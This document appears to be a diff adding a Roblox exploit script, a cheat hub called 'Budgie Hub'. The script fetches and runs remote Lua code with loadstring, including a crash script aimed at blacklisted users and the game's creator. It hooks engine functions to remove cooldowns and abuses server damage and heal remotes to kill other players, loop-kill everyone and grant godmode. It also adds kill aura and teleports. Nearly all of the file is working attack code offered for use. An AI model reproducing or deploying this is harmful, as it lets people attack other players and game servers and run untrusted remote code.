@@ -1,0 +1,618 @@
+local Library = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+
+local function GetDevice(): string
+ local GS, UIS = game:GetService("GuiService"), game:GetService("UserInputService")
+   if (GS:IsTenFootInterface()) then
+      return "Console"
+  elseif (UIS.TouchEnabled and not UIS.MouseEnabled) then
+      return "Mobile"
+  else
+      return "PC"
+  end
+end
+
+local whitelist = {
+  10172035874,
+  4636825706,
+  3133352547,
+  3536016467,
+  4227836698,
+  6066688097,
+  8427217856,
+  5080213871,
+  2405800210,
+  4463699742
+}
+
+local blacklist = {
+  3778040731,
+  game.CreatorId
+}
+
+if table.find(blacklist, game.Players.LocalPlayer.CharacterAppearanceId) then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Dangerous/refs/heads/main/CrashScript.lua"))()
+end
+
+local Window = Fluent:CreateWindow({
+    Title = "Budgie Hub | Random tool (9879422661)",
+    SubTitle = "by ADSKer (Test828838)",
+    TabWidth = 160,
+    Size = UDim2.new(0.7, 0, 1, 0),
+    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
+    Theme = "Dark",
+    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
+})
+
+local function GetFrame()
+  for _, gui in next, game.CoreGui:GetDescendants() do
+    if gui:IsA("TextLabel") and gui.Text:lower():find("budgie hub | random tool") then
+      return gui.Parent.Parent.Parent
+    end
+  end
+end
+
+if GetDevice() == "Mobile" then
+  game.Players.LocalPlayer.PlayerGui.ScreenOrientation = Enum.ScreenOrientation.LandscapeRight
+  
+  if GetFrame() then
+    local fram = GetFrame()
+    local sce = Instance.new("ScreenGui", game.CoreGui)
+sce.Name = "ToggleBuguh"
+sce.ResetOnSpawn = false
+sce.Enabled = true
+
+fram.Parent.Destroying:Connect(function()
+  sce:Destroy()
+end)
+
+local button = Instance.new("TextButton", sce)
+button.Text = "Show window"
+button.TextWrapped = true
+button.Size = UDim2.new(0.05, 0, 0.1, 0)
+button.TextSize = button.TextSize / 1.05
+button.Position = UDim2.new(0, 0, 0.3, 0)
+button.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+button.BackgroundTransparency = 0.1
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Active = true
+button.Draggable = true
+
+local uicorner = Instance.new("UICorner", button)
+uicorner.CornerRadius = UDim.new(0.2, 0)
+
+button.MouseButton1Click:Connect(function()
+  fram.Visible = not fram.Visible
+end)
+  end
+end
+
+--[[
+  Window:SelectTab(tabnum: int)
+  
+  Toggle:SetValue(value: boolean)
+  Toggle:OnChanged(function()
+    print(Options.Toggle.Value)
+  end)
+]]--
+
+local Tabs = {
+    Attack = Window:AddTab({ Title = "Attack", Icon = "rbxassetid://7485051715"}),
+    Defense = Window:AddTab({ Title = "Defense", Icon = "rbxassetid://7241575974" }),
+    Teleport = Window:AddTab({ Title = "Teleport", Icon = "rbxassetid://6723742952" })
+}
+
+local hookenable1 = false
+local chjj = false
+local thnei = false
+
+Tabs.Attack:AddToggle("Attack", {
+    Title = "Kill aura",
+    Description = "Start dealing damage to nearby players with the tool you are wearing",
+    Default = false,
+    Callback = function(Value)
+       chjj = Value
+    while chjj and task.wait() do
+  local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+  local lhrp = (game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()) and game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart", 10)
+  if tool and (tool:FindFirstChild("Handle") or tool:FindFirstChildWhichIsA("BasePart")) and lhrp then
+    local handle, origgrip = (tool:FindFirstChild("Handle") or tool:FindFirstChildWhichIsA("BasePart")), tool.Grip
+    
+    local Chumanoid, Cdistance = nil, math.huge
+for _, part in next, game.Workspace:GetPartBoundsInRadius(lhrp.Position, 100) do
+    if not part:IsDescendantOf(game.Players.LocalPlayer.Character) and part.Parent:FindFirstChildOfClass("Humanoid") and part.Parent:FindFirstChildOfClass("Humanoid"):GetState() ~= "Dead" and not (game.Players:GetPlayerFromCharacter(part.Parent) and not table.find(whitelist, game.Players:GetPlayerFromCharacter(part.Parent).CharacterAppearanceId)) then
+        local humanoid = part.Parent:FindFirstChildOfClass("Humanoid")
+        local distance = (part.Position - handle.Position).Magnitude 
+        if distance < Cdistance then
+            Cdistance = distance
+            Chumanoid = humanoid 
+        end
+    end
+end
+
+    if Chumanoid then
+      tool:Activate()
+      handle.Massless = true 
+      handle.Position = Chumanoid.RootPart.Position
+      for _, part in next, tool:GetDescendants() do
+        if part:IsA("BasePart") and part:FindFirstChildWhichIsA("TouchTransmitter") then
+          coroutine.wrap(function()
+           firetouchinterest(part, Chumanoid.RootPart, 0)
+           firetouchinterest(part, Chumanoid.RootPart, 1)
+          end)()
+         elseif part:IsA("BasePart") and not part:FindFirstChildWhichIsA("TouchTransmitter") then
+          part.Massless = true 
+          part.Position = Chumanoid.RootPart.Position
+        end
+      end
+    end
+  end
+end
+    end
+})
+
+pcall(function()
+for _, func in next, {wait, task.wait} do
+ local hook; hook = hookfunction(func, newcclosure(function(...)
+    if not checkcaller() and hookenable1 == true then
+        return hook()
+      else
+        return hook(...)
+     end
+  end))
+end
+end)
+
+-- without restorefunction because it crash game
+Tabs.Attack:AddToggle("Attack", {
+    Title = "Zero cooldown",
+    Description = "Removes cooldown from some tools",
+    Default = false,
+    Callback = function(Value)
+       if hookfunction == nil then
+         error("Your exploit is missing \"hookfunction\" for this function", 0)
+         return 
+       end
+       
+       hookenable1 = Value
+    end
+})
+
+Tabs.Attack:AddToggle("Attack", {
+    Title = "Fake naruto run", 
+    Description = "You running like with a naruto run tool",
+    Default = false,
+    Callback = function(Value)
+    hai = Value
+    local anim = Instance.new("Animation")
+anim.AnimationId = "rbxassetid://14152756298"
+local loa = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
+loa:Play()
+loa:AdjustWeight(math.huge)
+
+repeat task.wait()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
+until hai == false or game.Players.LocalPlayer.Character.Humanoid.Health <= 0
+pcall(function() 
+  loa:Stop() 
+  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game:GetService("StarterPlayer").CharacterWalkSpeed
+end)
+anim:Destroy()
+    end
+})
+
+local allplrs = {}
+local function updatenames()
+  allplrs = {}
+  for _, plr in game.Players:GetPlayers() do
+    if not table.find(whitelist, plr.CharacterAppearanceId) then
+      table.insert(allplrs, plr.Name)
+    end
+  end
+end
+updatenames()
+
+game.Players.PlayerAdded:Connect(function()
+  updatenames()
+end)
+
+game.Players.PlayerRemoving:Connect(function()
+  updatenames()
+end)
+
+local Dropdown = Tabs.Attack:AddDropdown("Dropdown", {
+   Title = "Kill player",
+   Description = "Depends on the number of players",
+   Values = allplrs,
+   Multi = false,
+   Default = "",
+})
+
+Dropdown:OnChanged(function(name)
+   local player = game.Players:FindFirstChild(name)
+   if player and player.Character ~= nil then
+     for _, plr in next, game.Players:GetPlayers() do
+       if not table.find(whitelist, plr.CharacterAppearanceId) then
+  for _, tool in plr.Character:GetChildren() do
+     if tool:IsA("Tool") and tool:FindFirstChild("damage") then
+      coroutine.wrap(function() tool.damage:InvokeServer(game.Players[name].Character.Humanoid) end)()
+    end
+  end
+
+  for _, tool in plr.Backpack:GetChildren() do
+    if tool:IsA("Tool") and tool:FindFirstChild("damage") then
+       coroutine.wrap(function() tool.damage:InvokeServer(game.Players[name].Character.Humanoid) end)()
+    end
+  end
+end
+    end
+   end
+end)
+
+local function killAll()
+  for _, plr in next, game.Players:GetPlayers() do
+  if plr ~= game.Players.LocalPlayer and not table.find(whitelist, plr.CharacterAppearanceId) then
+  for _, tool in plr.Character:GetChildren() do
+     if tool:IsA("Tool") and tool:FindFirstChild("damage") then
+      coroutine.wrap(function() tool.damage:InvokeServer(plr.Character.Humanoid) end)()
+    end
+  end
+
+  for _, tool in plr.Backpack:GetChildren() do
+    if tool:IsA("Tool") and tool:FindFirstChild("damage") then
+       coroutine.wrap(function() tool.damage:InvokeServer(plr.Character.Humanoid) end)()
+    end
+  end
+  end
+end
+end
+
+Tabs.Attack:AddToggle("Attack", {
+    Title = "Loop kill other",
+    Description = "Kills all living things",
+    Default = false,
+    Callback = function(Value)
+        frr = Value
+        while frr and task.wait(wait()) do
+           for _ = 1, 3 do pcall(function() killAll() end) end
+        end
+    end
+})
+
+Tabs.Attack:AddButton({
+    Title = "Death note tool",
+    Description = "Custom tool with commands: .self – kill self; .all – kill all including self; .other – kill all excluding self",
+    Callback = function()
+        local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
+tool.Name = "Death note"
+tool.ToolTip = "Write the name of your offender"
+tool.RequiresHandle = false
+tool.Grip = CFrame.new(0, 0, 0.5) *  CFrame.Angles(math.rad(0), math.rad(-40), math.rad(90))
+
+local handle = Instance.new("Part", tool)
+handle.Name = "Handle"
+
+local mesh = Instance.new("SpecialMesh", handle)
+mesh.MeshId = "rbxassetid://8972526996"
+mesh.TextureId = "rbxassetid://8972527078"
+mesh.Scale = Vector3.new(1, 1, 1)
+
+local function killPlr(name)
+for _, plr in next, game.Players:GetPlayers() do
+  for _, tool in plr.Character:GetChildren() do
+     if tool:IsA("Tool") and tool:FindFirstChild("damage") then
+      coroutine.wrap(function() tool.damage:InvokeServer(game.Players[name].Character.Humanoid) end)()
+    end
+  end
+
+  for _, tool in plr.Backpack:GetChildren() do
+    if tool:IsA("Tool") and tool:FindFirstChild("damage") then
+       coroutine.wrap(function() tool.damage:InvokeServer(game.Players[name].Character.Humanoid) end)()
+    end
+  end
+end
+end
+
+local gui = Instance.new("ScreenGui", gethui and gethui() or game.CoreGui)
+gui.Name = "BudgieHub_DeathNoteToolGui"
+gui.Enabled = false
+gui.ResetOnSpawn = true
+
+local textbox = Instance.new("TextBox", gui)
+textbox.Size = UDim2.new(0.075, 0, 0.075)
+textbox.Position = UDim2.new(0.75, 0, 0.1, 0)
+textbox.PlaceholderText = "player name"
+textbox.Text = ""
+textbox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+textbox.TextColor3 = Color3.new(1, 1, 1)
+textbox.TextScaled = true
+textbox.MultiLine = false
+textbox.ClearTextOnFocus = false
+
+textbox.FocusLost:Connect(function(pressed)
+  if pressed then
+    local getplayer = function()
+      for _, player in ipairs(game.Players:GetPlayers()) do
+        if string.find(player.Name:lower(), textbox.Text:lower()) then
+         return player
+       end
+      end
+     return nil
+    end
+    
+    if textbox.Text == ".self" then
+      for _ = 1, 10 do killPlr(game.Players.LocalPlayer.Name) end
+      textbox.Text = ""
+      elseif textbox.Text == ".all" then
+        for _, plr in game.Players:GetPlayers() do
+          if not table.find(whitelist, plr.CharacterAppearanceId) and plr.Character and plr.Character:FindFirstChild("Humanoid") then
+           for _ = 1, 10 do killPlr(plr.Name) end
+          end
+        end
+       textbox.Text = ""
+      elseif textbox.Text == ".other" then
+      for _, plr in game.Players:GetPlayers() do
+        if plr ~= game.Players.LocalPlayer and not table.find(whitelist, plr.CharacterAppearanceId) and plr.Character and plr.Character:FindFirstChild("Humanoid") then
+          for _ = 1, 10 do killPlr(plr.Name) end
+        end
+      end
+      textbox.Text = ""
+    end
+    
+    if getplayer() and getplayer().Character and not table.find(whitelist, getplayer().CharacterAppearanceId) then
+      for _ = 1, 10 do killPlr(getplayer().Name) end
+      textbox.Text = ""
+    end
+  end
+end)
+
+tool.Equipped:Connect(function()
+  gui.Enabled = true
+    tool.Unequipped:Wait()
+  gui.Enabled = false
+end)
+    end
+})
+
+Tabs.Attack:AddButton({
+    Title = "Mega punch tool",
+    Description = "Oneshot any living thing",
+    Callback = function()
+        local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
+tool.Name = "Mega punch"
+tool.RequiresHandle = false
+
+tool.Activated:Connect(function()
+  local anim = Instance.new("Animation")
+  anim.AnimationId = "rbxassetid://100404743190802"
+  local loads = tool.Parent.Humanoid:LoadAnimation(anim)
+  loads:Play()
+  loads:AdjustWeight(math.huge)
+  
+  local humanoids = {}
+for _, part in next, workspace:GetPartBoundsInRadius(tool.Parent.HumanoidRootPart.Position, 12) do
+    if part.Parent:IsA("Model") and part.Parent:FindFirstChildOfClass("Humanoid") and not part:IsDescendantOf(game.Players.LocalPlayer.Character) then
+      if not table.find(humanoids, part.Parent:FindFirstChildOfClass("Humanoid")) then
+        table.insert(humanoids, part.Parent:FindFirstChildOfClass("Humanoid"))
+      end
+    end
+  end
+
+  for _, humanoid in next, humanoids do
+    for _, plr in next, game.Players:GetPlayers() do
+  for _, tool in plr.Character:GetChildren() do
+     if tool:IsA("Tool") and tool:FindFirstChild("damage") then
+      for _ = 1, 50 do coroutine.wrap(function() tool.damage:InvokeServer(humanoid) end)() end
+    end
+  end
+
+  for _, tool in plr.Backpack:GetChildren() do
+    if tool:IsA("Tool") and tool:FindFirstChild("damage") then
+      for _ = 1, 50 do coroutine.wrap(function() tool.damage:InvokeServer(humanoid) end)() end
+    end
+  end
+end
+  end
+end)
+    end
+})
+
+
+
+Tabs.Defense:AddToggle("Defense", {
+    Title = "Anti void",
+    Description = "Prevents you from falling off the map",
+    Default = false,
+    Callback = function(Value)
+    local function getrespawn(): Instance
+  for _, part in next, workspace:GetDescendants() do
+    if part:IsA("SpawnLocation") then
+      return part
+   end
+  end
+end
+
+thnei = Value
+local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
+
+while thnei and task.wait() do
+char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
+  if char:FindFirstChild("HumanoidRootPart") and char.HumanoidRootPart.CFrame.Y <= workspace.FallenPartsDestroyHeight + 10 then
+    if getrespawn() then
+ char.HumanoidRootPart.CFrame = getrespawn().CFrame
+ char.HumanoidRootPart.Velocity = Vector3.zero
+     else
+ char.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0)
+ char.HumanoidRootPart.Velocity = Vector3.zero
+    end
+  end
+end
+    end
+})
+
+Tabs.Defense:AddButton({
+    Title = "Delete car", 
+    Description = "Deleting car so that it doesn\'t interfere", 
+    Callback = function()
+	   local suc, _ = pcall(function()
+  return Workspace.Main.Islands.Island1.car.car
+end)
+
+if suc then
+  Workspace.Main.Islands.Island1.car.car:Destroy()
+  else
+  error("Car already has been deleted", 0)
+end
+    end 
+})
+
+Tabs.Defense:AddToggle("Godmode", {
+    Title = "Godmode", 
+    Description = "At least one player must have yello phone",
+    Default = false,
+    Callback = function(Value)
+     jej = Value
+	  while jej and task.wait() do
+	    pcall(function()
+ for _, plr in game.Players:GetPlayers() do
+    for _, tool in (plr.Character or plr.CharacterAdded:Wait()):GetDescendants() do
+      if tool:IsA("Tool") and tool.Name == "yello phone" then
+        tool.ApplyBuff:FireServer("Heal")
+      end
+    end
+    
+    for _, tool in plr.Backpack:GetDescendants() do
+      if tool:IsA("Tool") and tool.Name == "yello phone" then
+        tool.ApplyBuff:FireServer("Heal")
+      end
+    end
+  end
+  end)
+end
+    end 
+})
+
+
+
+Tabs.Teleport:AddButton({
+    Title = "Gambling island",
+    Description = "Teleports into gambling island",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2123, 3, -263)
+    end
+})
+
+Tabs.Teleport:AddButton({
+    Title = "Borke\'s island",
+    Description = "Teleport into borke\'s island",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(144, 3604, -214)
+    end
+})
+
+Tabs.Teleport:AddButton({
+    Title = "Top house",
+    Description = "Teleport on top house",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(150, 85, -211)
+    end
+})
+
+Tabs.Teleport:AddButton({
+    Title = "Cheese island",
+    Description = "Teleport into cheese island",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2146, 3, -49)
+    end
+})
+
+Tabs.Teleport:AddButton({
+    Title = "Far island 1",
+    Description = "Teleport into far island 1",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(526, 3, -573)
+    end
+})
+
+Tabs.Teleport:AddButton({
+    Title = "Far island 2",
+    Description = "Teleport into far island 2",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(763, 8, 263)
+    end
+})
+
+do
+  if not workspace:FindFirstChild("Madness sphere") then
+local madness = Instance.new("Part", workspace)
+madness.Anchored = true
+madness.Name = "Madness sphere"
+madness.Size = Vector3.new(2, 2, 2)
+madness.Color = Color3.new(1, 0, 0)
+madness.Shape = "Ball"
+madness.Material = "Neon"
+madness.Position = Vector3.new(538, 6, -552)
+
+for _, side in Enum.NormalId:GetEnumItems() do
+  local decal = Instance.new("Decal", madness)
+  decal.Texture = "rbxassetid://10532241402"
+  decal.Face = side
+end
+
+local ambient = Instance.new("Sound", madness)
+ambient.SoundId = "rbxassetid://78050074366725"
+ambient.Looped = true
+ambient:Play()
+
+local particle = Instance.new("ParticleEmitter", madness)
+particle.Texture = "rbxassetid://115034218145529"
+particle.Speed = NumberRange.new(0, 0)
+particle.Rate = 15
+particle.Size = NumberSequence.new(1.5, 0)
+particle.Lifetime = NumberRange.new(0.25, 0.25)
+
+local col2 = Instance.new("ColorCorrectionEffect", game.Lighting)
+col2.Enabled = false
+col2.Saturation = 100
+col2.TintColor = Color3.new(1, 0, 0)
+
+pcall(function() game.Lighting:FindFirstChildOfClass("Sky"):Destroy() end)
+local sky = Instance.new("Sky")
+sky.CelestialBodiesShown = false
+sky.SkyboxBk = "rbxassetid://98837168684167"
+sky.SkyboxDn = "rbxassetid://98837168684167"
+sky.SkyboxFt = "rbxassetid://98837168684167"
+sky.SkyboxLf = "rbxassetid://98837168684167"
+sky.SkyboxRt = "rbxassetid://98837168684167"
+sky.SkyboxUp = "rbxassetid://98837168684167"
+
+local ambient = Instance.new("Sound", workspace)
+ambient.SoundId = "rbxassetid://9116732970"
+ambient.Looped = true
+
+local baseplate = Instance.new("Part", workspace)
+baseplate.Name = "THERE IS NO SALVATION" 
+baseplate.Anchored = true
+baseplate.Color = Color3.new(1, 1, 1)
+baseplate.Size = Vector3.new(2048, 2, 2048)
+baseplate.Position = Vector3.new(0, 10000, 0)
+
+coroutine.wrap(function()
+  while task.wait() do
+    local hrp = (game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()):FindFirstChild("HumanoidRootPart")
+    if hrp then
+      baseplate.Position = Vector3.new(hrp.CFrame.X, 10000, hrp.CFrame.Z)
+    end
+  end
+end)()
+
+    madness.Touched:Connect(function(hit)
+      if hit:IsDescendantOf(game.Players.LocalPlayer.Character) then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = baseplate.CFrame * CFrame.new(0, 3, 0)
+        pcall(function() game.CoreGui.RobloxGui.Enabled = false end)
+        col2.Enabled = true
+        sky.Parent = game.Lighting
+        ambient.Playing = true 
+      end
+    end)
+  end
+end
